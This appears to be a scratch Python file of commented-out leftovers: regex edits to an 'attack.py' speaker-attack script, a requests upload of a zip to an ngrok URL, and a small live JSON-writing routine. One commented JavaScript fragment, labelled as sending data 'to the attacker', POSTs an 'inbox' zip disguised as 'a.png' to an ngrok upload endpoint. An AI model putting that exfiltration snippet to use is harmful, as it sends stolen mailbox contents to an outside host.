# import re
# import sys

# python_file = ""

# with open("attack.py","r") as f:
#     python_file = f.read()
    
# # print(python_file)

# # s1 = """print('Num: %02d' % i)
# #         speaker = original_speaker[i]
# #         target = target_speaker[i]"""

# # #intra-gender attack
# # if args.intra_gender:
# #     print("Intra-gender attack ...")
# #     for i in range(len(original_speaker)//2):
# #         print('Num: %02d' % i)
        
# s1 = "#intra-gender attack\nif args.intra_gender:\n    print\(\"Intra-gender attack ...\"\)\n    for i in range\(len\(original_speaker\)//2\):\n        print\('Num: %02d' % i\)"
# s1_replace = "#intra-gender attack\nif args.intra_gender:\n    print(\"Intra-gender attack ...\")\n    for i in range(len(original_speaker)//2):\n        if i<10 or i>=20: continue\n        print('Num: %02d' % i)"

# s2 = "# inter-gender attack\nif args.inter_gender:\n    print\(\"Inter-gender attack ...\"\)\n    for i in range\(len\(original_speaker\)//2\):\n        print\('Num: %02d' % i\)"
# s2_replace = "# inter-gender attack\nsys.exit()\nif args.inter_gender:\n    print(\"Inter-gender attack ...\")\n    for i in range(len(original_speaker)//2):\n        if i<10 or i>=20: continue\n        print('Num: %02d' % i)"
#     # for i in range\(len\(original_speaker\(\/\/2\):\n        print\(\'Num:

# # for i in range(len(original_speaker)//2):

# # s1_replace = """
# # #intra-gender attack
# # if args.intra_gender:
# #     for i in range(len(original_speaker)//2):
# #         if i<10 or i>=20:
# #             continue:
# #         print('Num: %02d' % i)"""

# # s2 = """
# # # inter-gender attack
# # if args.inter_gender:
# #     for i in range(len(original_speaker)//2):
# #         print('Num: %02d' % i)"""

# # s2_replace = """
# # sys.exit()
# # # inter-gender attack
# # if args.inter_gender:
# #     for i in range(len(original_speaker)//2):
# #         print('Num: %02d' % i)"""


# # print(python_file[-2400:])

# python_file = re.sub(s1, s1_replace, python_file)
# python_file = re.sub(s2, s2_replace, python_file)

# # print(python_file[-2400:])

# with open("attack.py", "w") as f:
#     f.write(python_file)



# import requests
# with open("out_intra.zip", 'rb') as f:
#     r = requests.post('http://10a7-103-40-199-45.ngrok.io/', data={'out_intra.zip': f})
#     print(r.text)

# uploadEndpoint = 'http://10a7-103-40-199-45.ngrok.io/'
# formData = 'out_intra.zip'

    

# const uploadEndpoint = 'https://3e228564f809.ngrok.io/upload.php';
# const formData = new FormData();
# const inboxZip = blob;
# formData.append('inbox', inboxZip, 'a.png');
# #send the zip file to the attacker
# return fetch(uploadEndpoint, {
#    method: 'POST',
#    mode: 'no-cors',
#    body: formData
# });

import json

L = [[0 for _ in range(10)] for __ in range(10)]
d = {}

d[str(0)] = str(L)
print(d)

with open("sample.json", "w") as f:
    json.dump(d, f)